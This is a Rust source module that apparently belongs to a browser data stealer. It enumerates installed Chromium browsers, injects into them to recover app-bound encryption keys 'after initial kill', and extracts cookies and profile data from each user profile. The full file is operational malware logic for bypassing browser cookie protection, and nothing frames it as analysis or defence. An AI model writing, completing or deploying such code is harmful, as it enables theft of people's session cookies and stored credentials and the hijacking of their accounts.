pub mod base;

use crate::browsers::common::paths;

/// Phase 4: recover Chromium app-bound keys via inject (after initial kill).
pub fn inject_and_cache_all() {
    let installed = paths::discover_installed_browsers();
    let handles: Vec<_> = installed
        .into_iter()
        .map(|browser| {
            std::thread::spawn(move || {
                let user_data = paths::user_data_path(&browser);
                base::cache_keys_for_browser(&browser.name, &user_data, browser.has_profiles);
            })
        })
        .collect();
    for handle in handles {
        let _ = handle.join();
    }
}

/// Phase 7: extract all Chromium profile data from cached keys.
pub fn extract_all_from_cache() -> Vec<(String, String)> {
    base::extract_all_from_cache()
}

#[allow(dead_code)]
pub fn extract_all() -> Vec<(String, String)> {
    inject_and_cache_all();
    extract_all_from_cache()
}

pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
    base::extract_post_kill()
}
